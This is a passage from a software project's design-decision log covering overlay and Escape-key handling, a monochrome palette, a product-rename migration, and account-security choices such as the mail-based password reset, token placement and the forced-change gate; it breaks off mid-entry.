**Question.** The brief asks for every secondary screen to be a pop-up over the
interface rather than a screen you navigate to — settings, starting a session, the
profile menu — for a mobile-native feel. `CLAUDE.md` said this app has no modal and
gave a specific reason: inventing one would put a second dismissal mechanism up
against `AskCard`'s, which is the one thing on screen that must never have to argue
about who owns Escape.

**Decision.** Yes, and the objection is answered rather than accepted as a cost.
What arrived is not a second mechanism but a **single arbiter**: `ui/overlay.ts`
holds a LIFO stack of dismissible layers and installs exactly one capture-phase
`keydown` listener. `AskCard`, `Dropdown`, `SessionMenu` and `Sheet` all register
through `useDismissible` instead of binding `window` themselves. The count of
`window` Escape bindings went from **five to one**.

Two pure rules decide everything, so `webcheck` asserts the behaviour rather than a
transcription of it: **typing beats every layer**, and otherwise **the most
recently opened layer owns Escape and stops propagation**. The contract
`stop === (dismiss !== null)` is asserted over every generated stack, because the
failure this replaces was precisely a component that stopped propagation *before*
deciding whether it would act — a capture-phase `stopPropagation` at `window` ends
the entire dispatch, so Escape with a card up cancelled the agent's tool call and
left the command menu the reader was actually aiming at wide open.

**Two behaviours fall out with no code.** A menu inside a sheet takes Escape, the
sheet takes the second. A sheet opening over a parked question closes itself and
leaves the card untouched — where the old arrangement folded a card nobody could
see.

**Stacking is the other half, and the mechanism is the portal.** `Sheet` is a
`createPortal` child of `document.body`, so it wins by being outside `#root`
rather than by outranking anything inside it. That matters because `AskCard`'s own
docblock records a measured regression from exactly the opposite move: a positive
`z-index` on a frame *inside* `Composer`'s stacking context outranked the `z-40` on
every menu trapped in that context, and a tap aimed at a `/` command landed on an
approve button. `AskCard` keeps its bare `absolute` with no z-index, and its
docblock now names the portal explicitly — because a working overlay layer makes
"give it a z-index so it matches" look like tidying.

`ToastHost` portals too, for two reasons that are both requirements: `inert` goes
on `#root` while a sheet is open, so a toast rendered inside it would be untappable
exactly when it is needed; and every failure inside the settings sheet is reported
through `toast()`, so it moved to `z-60` to sit above the sheet that raised it.

**The row-level confirmation is untouched.** Deleting a person, retiring a machine
and revoking an API key stay inline: a question, its answer and its undo laid out
left-to-right is a *row* shape, and it keeps the name it is about beside it.

**Status.** Current

### Q7.69 — Pop-ups: state, or routes?

**Question.** Settings and "new session" become pop-ups. Do they keep their URLs?

**Decision.** They keep them, and it is the cheapest decision in the rework.
`/settings/…` and `/new/:machineId` stay real routes; `App` renders two things at
once — the background from the path recorded when the overlay opened, and the
overlay from the live route.

**What it buys.** A deep link works. A reload keeps the pop-up open. And the
phone's Back button closes it with **no code at all**, because Back pops the
history entry that opened it — which is the whole point of a mobile-native feel and
would have needed a hand-rolled interception otherwise. Not one existing `webcheck`
assertion about `parseSettingsRoute`, `settingsPath`, `visibleSections` or
`sectionAllowed` had to change.

**Where "what is underneath" lives.** `history.state`, as `{under}`, written by
`navigate`. It is the only store that is **per history entry**, so it survives
Back, Forward *and* a reload, which neither a module variable nor `sessionStorage`
does. It was already being passed as `null`; this is one argument changing.
Overlay→overlay carries `under` forward, so `/new` → "Add a machine" →
`/settings/machines` keeps the *session* underneath rather than stacking one
pop-up under the other.

**`history.back()` on the ✕ is refused**, for `Header.tsx`'s reason plus a sharper
one: on a cold deep link to `/settings` there is exactly one entry, so Back leaves
the app. `under` falls back to `/`, so a shared link opens the sheet over the list.
That also let `Header.closeTo` and `close="always"` be deleted — the rule they
carried is now `useUnder` and `settingsUp`, two functions a driver asserts rather
than a prop nothing could.

**Status.** Current

### Q7.70 — What does a monochrome palette cost, and what does it buy?

**Question.** The palette is light beige-white with no hue. Nine session states,
diffs, syntax highlighting and every destructive control were carrying meaning in
colour. What survives that?

**Decision.** Re-encode each on an axis that is not hue, and name the losses.

**The mechanism that made it a one-file change.** Every pure function here already
returned a **rank**, never a colour — `statusTone`, `machineSubline`,
`sublineWarns`, `sessionNotice`, `pieTone` — with the colour confined to paint
tables. So the whole first half of the rework changed **no asserted signature**,
and "no existing `webcheck` assertion may need editing" was usable as the
acceptance criterion. `sublineWarns` keeps its name deliberately: "warn" now names
a rank, not a hue, and renaming it would cost two assertion edits on the one screen
where an approval must never be hidden.

**What each state spends instead.** `blocked` is a filled dot with a **permanent**
ring plus a semibold row title plus a count on its folder. `running` is a filled
dot with a ring **animated from zero**. `stopping`/`waiting`/`idle`/`ended` are
hollow. `failed`/`stalled` are an `X` **glyph** — the one shape change, and the
strongest non-colour cue at 10px.

**One place it is strictly better.** Under `prefers-reduced-motion` the animation
collapses with no fill mode, so `running` settles into a plain filled dot and is
still not `blocked`'s permanent ring. The hue-based palette could not do that. The
diff is the other: `bg-add/10` and `bg-del/10` differed by ~2% luminance over
`raised` and were told apart **by hue alone** — invisible to roughly 8% of men, on
the screen where somebody approves a file write. Band-versus-no-band plus
full-strength-versus-`faint` text plus the `+`/`-` already rendered is separable by
everyone.

⚠ **`--color-add` and `--color-del` are back, and this paragraph's objection still
stands — it is answered rather than withdrawn.** Measured on the new values, the two
tints are **1.024** apart (luminance 0.8372 against 0.8168), so they are still told
apart by hue and nothing about that got better. What changed is that hue is no longer
the only channel carrying it: every line draws a `+`/`−` sigil, and `DiffView` has
**two** line-number gutters, so an addition is the line with no old number and a
removal is the line with no new one. Shape and position say which is which; the tint
is redundant. Note that band-versus-no-band is *gone* as a distinction — both sides
are tinted now, which is what the reference look requires — so the sigil and the
gutters are load-bearing rather than decorative. Q3.104 is the entry; this one keeps
the number that made it necessary.

**What it costs, precisely.** Syntax highlighting loses two real distinctions: a
string no longer differs from a number, and a function name no longer differs from
a keyword. There are about four separable slots on paper at 13px and six things
wanted one; the two kept are comment-versus-code and literal-versus-structure,
which are the ones that carry reading. `StreamDot` loses `connecting` versus
`waiting` — a fourth tone rendering identically to a third would be a lie, and
`SessionView` says the phase in words beside it.

**Destructive controls keep exactly one colour**, `--color-danger: #7e362b`, a dark
oxblood on the same warm axis, **text and border only, never a fill**. That is not
sufficient on its own, so irreversibility is carried by three things: a **required
glyph**, enforced by `DangerButton` being the only door to the look — "must lead
with an icon" cannot be typed on `children`, so it is typed as a component; the
two-step confirm with **Cancel last**, which is the property that was actually
measured; and one rule stated once — **a `bg-fg` fill is only ever the reversible
option**, so a destructive button is never filled and in a confirming pair the
filled button is Cancel. Without that last rule "filled" would mean *the safe
default* on the ask card and *the irreversible one* in settings, which is worse
than encoding nothing.

**The hazard that shaped the sequencing.** Tailwind v4 emits **no rule at all** for
a utility whose token does not exist — `bg-warn` with no `--color-warn` is not an
error, not a build warning and not a type failure; the background silently never
paints. Verified by building a deliberate `bg-nonexistent` and watching it pass. So
the retired tokens were *retargeted* first and deleted only once a source-text
assertion in `webcheck` confirmed nothing named them. That assertion strips
comments — the opposite of the `groups.orphans` ban one section over, and
deliberately: this one is about a class the browser will try to apply, and the
docblocks explaining the hazard name the tokens in the course of explaining it.

**Status.** Current

### Q7.71 — remoslop → reemoat, including the protocol. What had to move by hand?

**Question.** The product is renamed and the old name is to be used nowhere.
`remoslop` appeared ~800 times across ~40 files, and about a third of those are not
text — they are an env-var namespace, a directory of live state, a supervisor label,
a docker volume holding the fleet's signing key, and the tunnel's own handshake.

**Decision.** All of it, in one pass, with the data migrated rather than recreated.
The code rename is mechanical; what follows is the part that is not, and every item
here is something a `sed` over the repository would have silently destroyed.

**1. The signing key, and everybody's account.** The control plane's SQLite lives
in the docker volume `remoslop-cp-state` — the Ed25519 key that mints every token in
the fleet, plus users, passwords, machines and grants. Renaming the volume in
`compose.yml` gives compose an **empty** one: a fresh key, no users, and a bootstrap
admin printed once into a log. Copied volume-to-volume before the first
`compose up`, and the old volume is **kept** as the only rollback there is.

**2. `identity.issuer`, or a total outage that looks like a bad token.** The daemon
stores the issuer it enrolled against and `auth.ts:247` compares every token's `iss`
to it. The control plane now mints `reemoat-cp`, so without a migration every single
request answers `wrong_issuer`. One `UPDATE` moved it; the signing keys are
untouched, so the machine keeps its id and no re-enrollment was needed — which is
the difference between a five-second migration and re-enrolling the fleet.

**3. Seven sessions' worth of absolute paths.** `~/.remoslop` → `~/.reemoat` moves
the daemon's database, its uploads and its worktree root.
`sessions.workspace_root` and `workspace_json` hold absolute paths under the old
root, so those sessions would have come back `workspace_missing`. Migrated in the
same transaction, behind a file copy.

**4. The git worktree pair, which is two files pointing at each other.**
`<repo>/.git/worktrees/<id>/gitdir` names the worktree's `.git`, and that `.git`
names the repo. Only the first moves, because the repo directory did not — and the
worktree's own directory name (`remoslop-f05669ac`) is derived from the *repository
folder* rather than from the product, so it correctly did not change either.

**5. The supervisor runs two daemons if you only add one.** `com.remoslop.daemon`
had to be booted out and its plist deleted before `com.reemoat.daemon` was
bootstrapped; launchd loads every plist in `~/Library/LaunchAgents` at login, so a
leftover file is a second daemon at the next reboot — contending for the single-row
`daemon` lock and losing.

**6. `LEGACY_STORAGE` must never be renamed with the product**, and a blanket
rename caught it. `packages/web/src/cp.ts` reads `remoslop.credential` and
`remoslop.apiKey` once and adopts them, so shipping a rename does not sign out every
open tab. Renamed to match the new name, they became identical to the key
`setSession` *writes* — and `setSession` sweeps that list immediately afterwards, so
signing in deleted the credential it had just stored and every request went out
unauthenticated. `webcheck` failed on the first run. Those two strings name what is
already in a browser, not this product; they get deleted rather than updated, once
no tab has been signed in since before the rename.

**What the protocol change costs, stated plainly.** `iss` and the `remoslop-*`
tunnel headers are a contract between two services that deploy independently, so
this release is **not** backwards compatible: an old daemon cannot talk to the new
control plane, and a new daemon cannot talk to an old one. That was acceptable here
because the whole fleet is one machine and both halves came up together. On a fleet
with more than one host the shape is accept-both first, send-new second, with every
host updated in between.

**7. The agent's own conversation store, which is the third pointer of shape 4 and
was missed.** Found by review, before it fired. `~/.claude/projects/` is keyed by a
slug of the session's **cwd**, so moving the worktree root orphaned every
conversation: the directory on disk read
`-Users-rends--remoslop-worktrees-…` while `sessions.workspace_root` had already
been migrated to `~/.reemoat/…`. The next `session/resume` would have been sent the
new cwd, found nothing, and answered `resourceNotFound` — which `session.ts` turns
into `SessionForgottenError` and **persists in `sessions.resume_gave_up`**, gating
both automatic paths for ever. Seven worktree sessions, all still reading null, so
it had not fired; a manual `resume` would not have recovered them either, because
the cwd stays wrong. Two directories renamed, `--remoslop-worktrees-` →
`--reemoat-worktrees-` and nothing else — the worktree folder `remoslop-f05669ac`
is item 4's name and correctly did not move. Verified by the three-way match the
resume actually makes: `workspace_root` → slug → directory, and
`sessions.agent_session_id` → the `.jsonl` inside it.

**kimi and codex needed nothing, and the reason is worth writing down** because the
symptom looked identical. kimi's index is keyed by `sessionId` to an *absolute*
`sessionDir`, and it ignores the incoming `cwd` on resume — so only its `workDir`
metadata was stale, rewritten for tidiness rather than for function. codex has no
worktree cwd at all; its only session here runs in the repository directory, which
is the thing item 4 says did not move. **What decides is whether the agent derives
a path from cwd or resolves an id**, not whether the cwd changed.

**8. Three more browser keys, none of them on this list when it was written.**
`groups.ts` went `remoslop.collapsedGroups` → `reemoat.collapsedFolders` (both
halves at once, no adoption read, so every collapse set silently reset), and
`AgentsPanel`'s wizard key went `remoslop.login.<machine>.<agent>` →
`reemoat.login.…`, which reintroduces for one deploy the exact "back at a Sign in
button with a code on your clipboard" failure that key exists to prevent. Both
knowingly accepted rather than fixed: collapse state is cosmetic and self-heals on
the next tap, and a login run is per-tab with a 10-minute TTL against a 15-minute
device code. Recorded because the sweep that produced item 6 looked at `cp.ts`
alone, and "which storage keys does a rename move" is the question that had no
list.

**What the rename caught that only prose protects.** `cp.ts`'s own ⚠ block says
`LEGACY_STORAGE` must never be renamed with the product — and the sweep renamed the
*docblock above it*, so the paragraph explaining the trap named `reemoat.credential`
as the legacy key while the constant beneath it correctly said `remoslop.`.
`webcheck` asserts the constants and cannot see a comment, which is why the
constants survived and the explanation did not.

**What deliberately kept the old name.** The working directory the rename was
performed in — every path in `deploy/` is derived from the script's own location,
so the directory is not load-bearing, and moving it would re-render every unit for
nothing. (It has since moved anyway, for unrelated reasons, which is the evidence
for that claim rather than against it.) And one git branch, `remoslop/s_820a1130`, which is an existing session's
worktree branch: it is data, renaming it would break that session's association, and
`DEFAULT_BRANCH_PREFIX` gives every new session `reemoat/`.

**And the GitHub repository, which is the one place that mattered.** For a while
the sweep and the remote disagreed: the two `git clone` lines in
`deploy/README.md` had been rewritten to `…/reemoat.git` while `origin` still
pointed at the pre-rename repository — so the one path in this document a stranger
follows, the from-scratch install, failed at its first command with "Repository
not found", on both services.

**Settled by publication.** The project is published as
`github.com/rends-east/reemoat`, both clone lines name it, and
`deploy/systemd/reemoat.service.in` carries the same URL as its `Documentation=`.
The clone *destination* stays `~/srv/reemoat`. The transferable lesson is the one
worth keeping out of the eight items above: **a rename has to move the remote and
the documents that name it in the same act, or the install instructions point at
something that does not answer** — and that failure is invisible to every check in
this repository, because none of them clones anything.

**Half of it is checkable now, and is checked.** Nothing can prove a clone URL
resolves without cloning, but the *internal* agreement can be proved: `pincheck`
asserts `SOURCE_URL` — the AGPL §13 source offer `app.ts` serves — against the
`repository.url` in `package.json`. That is the pair a rename is most likely to
split, because one is prose in a manifest and the other is a string served to
strangers, and it was asserted nowhere until the release work went in. The clone
lines themselves are still only as right as the last person to read them.

**Status.** Current

### Q7.72 — Thirteen things reported off one screenshot. How many defects were they?

**Question.** A pass over the reworked UI produced thirteen numbered complaints:
the chat pane is the colour of the menu; the session header is not the page width;
a tool card is louder than the message above it; the left menu has a scrollbar
along its bottom; no pop-up scrolls with the wheel; the settings pop-up changes
size with the section; the Users table has collapsed. Treated as thirteen tickets
this is a day of nudging class strings.

**Decision.** Find the smallest number of causes first. It was four, and two of
them each accounted for three complaints.

**1. One missing background, three complaints.** `AppShell`'s `<main>` carried no
`bg-*` at all, so the whole right-hand column fell through to `body { background:
var(--color-ink) }` — the *same value* the rail paints with `bg-ink`. `border-r`
had already been deleted from the aside on the strength of a tonal step that
therefore did not exist. That one omission is: the conversation is the colour of
the menu; the header's fill and rule stop short of the right edge, because what
shows in the reserved scrollbar gutter is ink beside the header's `bg-surface/85`;
and the transcript's tones are inverted, with a tool card on `bg-surface` reading
as the brightest object on a screen where it should be the quietest. Painting
`main` fixed all three, and the palette's own semantics then said where everything
else goes with no invention: pane `surface`, tool card `ink` (which is also "a
recessed well", and a tool call *is* machinery under the conversation), user
bubble `raised`. "Both grey, the one you wrote louder than the one the agent ran"
fell out of the existing three tokens rather than needing a fourth.

**2. Two class strings, and every pop-up in the app.** `SHEET_BODY` was
`display: block` while both of its callers write `min-h-0 flex-1` on their top
child — properties a block container ignores. So every intended inner scroller
sized to its own content and had no scroll range (measured, `scrollHeight ===
clientHeight` at 2592px inside a 433px viewport), and each still carried
`overscroll-contain`, which ends the scroll chain **even on a container with
nothing to scroll** (measured: the same wheel moved 400px with it removed and 0px
with it present). The pointer was therefore always over a descendant refusing to
hand the wheel to the one box that could move. Adding `flex flex-col` fixes both
halves at once, because the children become real scrollers and their
`overscroll-contain` becomes true rather than merely stated. Separately
`SHEET_PANEL` declared only a `max-h`, so the panel was content-sized — 155px,
475px and 492px for 2, 12 and 80 lines of body — and stepping through the settings
list resized the dialog under a pointer already aimed at the next row. It is a
definite `h-` now. Neither defect was visible to any driver: `typecheck` sees
strings, `web:build` emits whatever Tailwind recognises, and `webcheck` has no
DOM. Both are pinned there now as source-text assertions on the constants
themselves, in the same style as the retired-colour gate.

**3. The filter default, and the rule that came out of the round trip.** "Hide
inactive chats" asks for `"active"`, which is what the default was until this
rework moved it to `"all"` — because the filter icon had been drawn as an inert
placeholder, and this filter is the **only** route to an ended session anywhere in
the app. Narrowing the default behind a dead control puts every finished
conversation permanently out of reach. So the icon was wired (an existing
`Dropdown` onto an existing `setFilter`, which is what its own comment had
predicted) and the default narrowed in the same commit. The rule that generalises:
**a default may only be narrowed while some control can widen it again**, and if
the control ever goes back to being a placeholder the default goes back to `"all"`
beside it.

**4. One kebab, and one instruction not followed.** The Users row carried every
act as a peer button plus a 184px reserved slot — ~370px of controls against
roughly 330px of row on a 390px phone, so the name got single digits of pixel and
below `sm` the row stacked and wrapped. Everything moved behind a `Menu`, which
also retires the reserved slot, since the trigger is the same square on every row.
"Remove Keys entirely" was followed off the row and **not** out of the product:
that panel is the only caller of `adminRevokeKey` anywhere — `cpctl admin key`
mints keys it cannot revoke, and `myKeys`/`revokeMyKey` have no callers — so
deleting it would return API-key revocation to exactly the state the invariant "a
credential the code can read is a credential something must be able to write"
exists to end. It is one line in the menu.

**Two smaller ones, recorded because each looked like a rendering fault.** The
rail's scrollbar was `overflow-y-auto` emitting only `overflow-y: auto`, and CSS
Overflow 3 computes the unpaired `visible` on the other axis to `auto` — so a box
that declared one scroller got two, and with `scrollbar-width: thin` opting this
app out of overlay bars, the second painted a permanent bar across the bottom of
the menu with nothing actually overflowing. And the header magnifier focused its
search box by `document.querySelector`, which cannot work in a component mounted
twice: the `lg` aside is first in document order, so below `lg` the lookup returned
the copy inside a `display: none` subtree and `focus()` was a silent no-op — on the
device this app is for. A ref is scoped to its own mount by construction; asking
which mount is visible would have been the breakpoint-in-JavaScript `AppShell`
forbids.

**What the palette move actually was.** The rail and the pane are told apart by
**colourfulness**, not by lightness. The first values were a beige fading toward
white (OKLCH chroma 0.016 → 0.006) with 5.07 points of lightness between them,
which side by side reads as one surface with a seam. `surface` went the whole way
to a cream that is practically white (C=0.003) and `ink` went **up** in chroma
rather than down in lightness (C=0.026), so both got lighter and they are further
apart anyway: a 9× ratio in chroma does work 0.6 points of lightness cannot. Every
text token was re-measured against all three grounds and the floors in `index.css`
are the new numbers, not the old ones carried over — `faint` on `raised` is still
the binding case at 4.70:1.

**Status.** Current

### Q7.73 — The palette went beige, then delicate. Which is it, and what decides?

**Question.** Three positions in three passes: a warm beige-white; then `ink`
pushed *up* in chroma to 0.026 so a rail would read unmistakably beige beside a
near-white pane; then almost all of it taken back out. That is not converging by
itself, so what is the rule.

**Decision.** Chroma 0.003–0.006 across all three surfaces — greys with a memory
of warmth — and the middle position is recorded as wrong rather than as a step.
Beige at 0.026 is not a background: it is a decision the whole app then wears,
because `raised` is the message you wrote and `ink` was a tool card, so what
should have read as paper read as a colour scheme. `surface` is plain `#ffffff`.

**Three things fall out, and each replaces a rule that was true at the old
values.**

**1. The transcript spends one token at two strengths.** With `ink` at 1.06:1 from
the pane it is the rail's hint against a white page and not a card, so the tool
card cannot be `bg-ink` — which it was, for exactly one revision, and that was the
right answer while `ink` was beige. What the conversation needs is two grades of
the same grey: `bg-raised/50` (1.10:1) for machinery and `bg-raised` (1.22:1) for
the message you wrote. Both come off `raised`, because inventing a fourth paper
value to sit between two existing ones is how a palette stops being four sentences
long.

**2. A control is the colour of its ground, by request.** Every field and every
unfilled button now matches what it sits on — `bg-ink` in the rail, `bg-surface`
on a sheet — so `--color-edge-strong` is the *whole* of what says a control is
there, which is what its ≥3:1 floor was always for and is why `edge` is not an
alternative. The exceptions are values you must read once: the one-time secret,
the device code, the workspace warning. Those take a real fill, and the first two
had to be found — both were `bg-ink`, i.e. a password shown once in a box with no
fill and no border.

**3. `border-r` came back, and the rule is the ratio rather than the tokens.** It
was deleted on the grounds that rail-versus-pane is a tonal step. That claim was
false while `main` painted nothing, true for one revision at 1.18:1, and false
again at 1.06:1. Below roughly 1.15:1 a line divides and the tone only supports
it. The same arithmetic moved the selected session row off `bg-surface` — painted
the pane's own colour so it would read as connected to what it opens, which at
1.06:1 made the row saying *which conversation is open* the least visible thing in
the list — onto `bg-raised`. The premise had gone with the border anyway: a row
cannot run into a pane it is ruled off from.

**What did not move.** Every text token. `fg`, `muted`, `faint` and `danger` are
unchanged and every ratio went **up**, because the grounds got lighter — `faint`
on `raised` is 5.09:1 against a 4.5 floor, still the binding case and still the
reason it is not lighter. `--color-danger` is pinned by `webcheck` at `#7e362b`
and stayed.

**Status.** Current

### Q7.74 — Q7.40 refused email, a reset flow and a forced change. What changed?

**Decision.** All three are built, plus self-service registration, and the admin's
ability to enter somebody else's account is deleted in the same change.

**Why the earlier reasoning stopped holding.** Q7.40's argument was not that a
reset flow is bad; it was that *"what replaces a reset flow is an admin who can
reset a password, which this deployment has by definition — there is one."* That
premise is a fact about a fleet one person runs. The moment a second person has
an account, "an admin can reset a password" stops being a recovery mechanism and
becomes an **unlogged account takeover** available to anybody holding that
admin's session — which is exactly the escalation `POST /v1/me/password` spends
its whole docblock refusing, reached through a different door.

So the two halves are one change and neither is safe alone. Removing the admin
reset without email first leaves a fleet with no recovery; adding email without
removing it leaves the takeover.

**The invariant this buys**, stated as a property of the service rather than of a
route: *no route in this service issues a credential for an account other than
the caller's own.* The bootstrap in `main.ts` is not a route and has no caller —
it is the fleet coming into existence. `relaycheck` asserts it mechanically:
`db.prepare("INSERT INTO api_keys` appears in `app.ts` exactly once, and that
occurrence is not on a route reading `c.req.param("id")`.

**Three routes had to go, not two.** Deleting
`POST /v1/admin/users/:id/password` and `.../keys` while leaving `withKey` on
`POST /v1/admin/users` would have left the invariant true in the documentation
and false in the code — and `withKey` is the one `deploy/install.sh` actually
drove.

**Rejected: keeping the admin reset, gated on mail being unconfigured.** Small,
and defensible on the grounds that where there is no better path there should be
some path. It loses because a rule that switches itself off is absent exactly
when somebody is desperate, and because the whole point is that an admin cannot
enter an account — a capability that returns when SMTP breaks is not that.

**Status.** Reversed an earlier decision.

### Q7.75 — Why is the SMTP client hand-rolled, and what is deliberately missing?

**Decision.** ~590 lines over `node:net`/`node:tls`, with a `connect` seam.
No nodemailer.

**Why.** The seam is the reason, not the dependency count. `sendMessage` takes an
`SmtpDialer` rather than opening a socket — the shape `AcpClient` already uses
for `AgentProcess` — and that is what makes three properties assertable offline
that are otherwise invisible until they fail on somebody else's mail server:

1. **No silent downgrade.** With `security: "starttls"` against a server that
   does not advertise it, the client fails *and a driver can prove no `AUTH` and
   no `MAIL FROM` were ever written*. Asserting only that it throws passes even
   when the credentials went out in the clear first.
2. **The second `EHLO` wins.** Servers routinely advertise `AUTH` only after TLS,
   so a client that caches the pre-upgrade capability list works everywhere
   except against the servers that were careful.
3. **Ordering**, recorded as a sequence rather than a set.

A library gives none of those to a driver: it would be one more thing whose
correctness is asserted by having imported it.

**Measured, 2026-08-10**, against a real submission server (`smtp.example.com:587`
here, the deployment's own elsewhere) with a
deliberately wrong password: `535 5.7.8 Error: authentication failed`. Reaching
`535` rather than failing earlier is the end-to-end confirmation — DNS, TCP, the
greeting, EHLO, STARTTLS against a real certificate, the second EHLO, and
`AUTH PLAIN` all worked, and the only step that failed is the one made to fail.
Classified permanent (5xx), so it was not retried.

**Deliberately absent, and each for a stated reason.** DKIM — a key, a selector,
DNS and two canonicalization algorithms, and unnecessary because this is a
submission client to a real MTA which signs on the way out. Pooling and
pipelining — this service sends a handful of messages a day, and a pooled
connection is state on the event loop that carries every tunnel whose failure
mode costs somebody their password reset. CRAM-MD5 (needs the server to hold the
plaintext) and XOAUTH2 (a provider abstraction).

**Two decisions inside the encoder worth naming.** Both parts are **base64, not
quoted-printable**: QP has three independently-easy-to-get-wrong rules that fail
*per recipient*, invisibly from here, and base64 has one — it is also 7-bit clean,
so `8BITMIME` never has to be negotiated, and its alphabet excludes `.`, so no
body line can begin with one. And RFC 2047 encoded-words are chunked **by code
point**: slicing UTF-8 bytes at the 45-byte boundary splits a character across two
words, each decoded independently by the receiver, and it only appears once a
subject is long enough to need two words.

**Status.** Current.

### Q7.76 — With the admin reset gone, what happens to a forgotten password and no SMTP?

**Position.** Nothing. There is no recovery.

**What is actually true, and was not true before either.**
`POST /v1/me/password` requires the current password whenever a `user_passwords`
row exists, **whichever credential is presenting**. So an API key has never been
able to replace a forgotten password — while `schema.sql`, `.env.example`,
`SignIn.tsx` and Q7.40 all said the key was for *"getting back in when a password
is lost"*. That sentence was false when it was written; the change made it
visibly false, and every copy of it has been corrected rather than left standing.

The real recovery today was a ladder: key → create a second admin → sign in as
them → reset the first account. Deleting the reset route removes its top rung.

**Why it is accepted.** With mail configured and an address confirmed,
`POST /v1/forgot` is the recovery and this never bites. Without mail, the remedy
is `DELETE /v1/admin/users/:id` and recreate — which releases their machines
(they become ownerless, which is not a new state) and needs
`PUT /v1/admin/machines/:id/owner` to re-adopt.

**What it would take.** Letting `POST /v1/me/password` accept no `currentPassword`
when `caller.via === "api_key"`, and sweeping sessions and other keys on that
path — which would make the four corrected sentences true again. It was
considered and deferred rather than refused: a key is already permanent full
authority over the account, so the argument that it should also be able to
rotate the password is strong, and the argument against is that it converts a
leaked key from "read and act" into "and lock the owner out". Nobody has measured
which matters more here.

**What makes it visible rather than latent.** `GET /v1/admin/users` reports
`emailVerified` per row, so an admin can see exactly which accounts are exposed
to this, and `userState` draws it as a badge.

**Status.** Known limitation.

### Q7.77 — Where does a mailed token ride, and why not the path?

**Decision.** The URL fragment — `…/reset#t=<token>` — never a path segment and
never a query.

**Why.** A fragment is not sent to the server at all. `CLAUDE.md` already made
this argument when `readCredential` was narrowed to read a query credential only
on an `upgrade: websocket` request: *"the URL lands in history, in `Referer` and
in every intermediary's log"* — and `install.sh` tells operators to put a TLS
proxy in front, which logs request lines.

The second reason is the one that decides it: **corporate mail gateways and link
prefetchers `GET` every URL in an inbound message.** With the token in the path a
scanner fetches it, and a single-use link is burned before the human sees it. In
the fragment the scanner fetches `/reset` and learns nothing. Belt: `/confirm`
and `/reset` render a button rather than firing on mount, so even a scanner that
somehow had the token could not spend it with a `GET`.

Third, it sidesteps the SPA fallback's `looksLikeAsset`, which answers a JSON 404
for a last segment matching a short extension — so a token containing a dot would
have rendered a blank page. The token alphabet forbids one anyway, and
`webcheck` asserts both.

**Rejected: the path segment.** It is this app's idiom for route state and is
assertable through one parser, and the `Referer` argument for it is a wash —
`strict-origin-when-cross-origin` sends the full URL, query included, on
same-origin requests. It loses on the proxy log and on the scanner.

**Status.** Current.

### Q7.78 — Registration is a user-enumeration oracle. Why is that accepted?

**Position.** Accepted, bounded, and written down rather than papered over.

`POST /v1/login` spends ~51 ms on a decoy hash specifically so that an unknown
name, a user with no password row and a wrong password are indistinguishable —
in status *and* in time. `POST /v1/register` hands the first of those back: a
taken name is a `409`, because a name is the login and a form nobody can complete
is not a form.

**What bounds it.** Every branch of that route costs the same scrypt — the hash
runs *before* any lookup — so the 409 is not *also* a timing oracle. Each probe
takes one of two fleet-wide public-lane slots, so enumeration costs the attacker
what it costs the service. And `registerKey(name, address)` blocks a probing host
after five, in its own namespace so it cannot be used to lock somebody out of
signing in.

**What is not conceded.** An **address** is not something the person at the
keyboard chooses, so a taken one answers the same `200` as a fresh one, with a
notice mailed to whoever actually owns it — bounded to one per address per day,
because that notice is itself mail sent to a third party on an anonymous request.
`POST /v1/forgot` answers byte-identically for known, unknown and unverified, and
`requestPasswordReset` returns `void` in the client so no screen can branch on it
even by accident.

**Rejected: an email-first sign-up with no name.** It closes the oracle and
collapses the mode matrix — the arm with no SMTP has no address to be first with.

**Status.** Current.

### Q7.79 — Why is delivery off the request path, and what does the queue cost?

**Decision.** A `mail_outbox` table and a pump with concurrency one, never an
`await` inside a route.

**Why, and it is `scryptSync`'s argument.** `password.ts` records that the
synchronous KDF blocks the loop carrying the API listener, `serveStatic` and every
relay tunnel in the fleet. An SMTP handshake is the same class of thing and worse:
one to ninety seconds, its duration chosen by a remote host, several queued behind
a registration burst.

**The non-obvious half.** `net.connect(host)` resolves names with `dns.lookup()`,
which is `getaddrinfo` **on the libuv threadpool** — the same pool `scrypt` runs
on and `serveStatic` draws from. A hung DNS server or an MX that accepts TCP and
never answers consumes slots until password hashing queues behind it and the
sign-in page stops loading. **A mail outage must never become a sign-in outage.**
Concurrency one, hard per-step budgets, a 90 s wall-clock cap and a circuit
breaker are what make that true.

It also closes an oracle: a taken address mails a *notice* and a fresh one a
*confirmation*, so an inline send would make the two branches measurably
different in time and the identical body would stop meaning anything.

**What the queue costs, stated.** `mail_outbox.body` holds a rendered message
including a live one-time link — **the first plaintext credential in this
database**, beside a private key that mints every token in the fleet. Bounded on
purpose: cleared in the same statement that writes `sent_at`, kept on failure only
until `not_after` (the token's own expiry), and never returned by the admin log.

**Rejected: an in-memory queue.** It removes the plaintext-at-rest window
entirely. It loses because a confirmation lost to a deploy is a person who clicked
a button and got silence, and "did it go out" becomes unanswerable — which is half
of what an operator needs when mail is misconfigured.

**Status.** Current.

### Q7.80 — A forced password change needs a gate. Where does it live?

**Decision.** A second positional `app.use("/v1/*", …)`, registered after the four
routes that must stay reachable.

**Why positional.** The same mechanism THE LINE uses, and for the reason that
file already paid for: four exact-path `app.use` lines meant
`POST /v1/machines/:id/enrollments` served with **no credential at all**. A
per-handler `if` is a list, and a list goes stale one route later. Below the
second line a new route is covered by doing nothing; a route that genuinely must
be reachable has to move above it, which is a diff on the line that says what it
is.

**The reachable set is four**, each earning it: `GET /v1/me` (the only way to
*discover* the obligation), `POST /v1/me/password` (the remedy — and refusing the
remedy is `throttle.ts`'s own recorded failure), and both session-delete routes
(signing out everywhere is what somebody does when they think the password they
were handed has leaked). Deliberately *not* reachable: `GET /v1/me/sessions` (a
list is not a remedy), `POST /v1/tokens`, `POST /v1/me/keys` — minting a
permanent credential from a borrowed password is the escalation itself — and
every admin route.

**`403`, not `401`.** Both `cpFetch` and `cpctl` read a 401 as "the stored
credential is finished": the client would discard the session, the person would
sign in with the same password, and the loop closes. The code is distinct from
`requireAdmin`'s bare `forbidden` so a client can tell a wall from a permission
error — `bootstrap` depends on exactly that to render the wall instead of an
outage banner.

**Credential-blind — it never reads `via`.** An obligation belongs to the account,
not to the door. That is safe *because* `withKey` was deleted in the same change:
such an account cannot hold a key. Had it survived, a credential-blind gate would
break `cpctl` for that person and a `via`-aware one would be a bypass — both
wrong, which is why the two changes are one.

**It is not a security boundary**, and saying so is part of it: `relay/authorize.ts`
reads live user, machine and grant rows and knows nothing about this table, so a
token already minted keeps working for its remaining life and an open WebSocket
